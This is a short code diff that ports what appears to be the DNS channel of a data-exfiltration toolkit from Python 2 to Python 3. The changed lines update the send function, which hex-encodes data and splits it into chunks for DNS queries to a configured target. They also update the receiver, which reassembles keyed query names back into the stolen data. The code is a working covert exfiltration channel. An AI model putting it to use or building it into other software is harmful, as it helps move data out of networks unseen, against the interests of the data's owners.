@@ -12,7 +12,7 @@ buf = {}
 def handle_dns_packet(x):
     global buf
     try:
-        qname = x.payload.payload.payload.qd.qname
+        qname = str(x.payload.payload.payload.qd.qname)
         if (config['key'] in qname):
             app_exfiltrate.log_message(
                 'info', '[dns] DNS Query: {0}'.format(qname))
@@ -26,7 +26,8 @@ def handle_dns_packet(x):
             if data not in buf[jobid]:
                 buf[jobid].append(data)
             if (len(qname) < 68):
-                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
+                app_exfiltrate.retrieve_data(
+                    bytes.fromhex(''.join(buf[jobid])))
                 buf[jobid] = []
     except Exception as e:
         # print e
@@ -37,7 +38,7 @@ def send(data):
     target = config['target']
     port = config['port']
     jobid = data.split("|!|")[0]
-    data = data.encode('hex')
+    data = (data.encode('utf-8') if isinstance(data, str) else data).hex()
     while data != "":
         tmp = data[:66 - len(config['key']) - len(jobid)]
         data = data.replace(tmp, '')
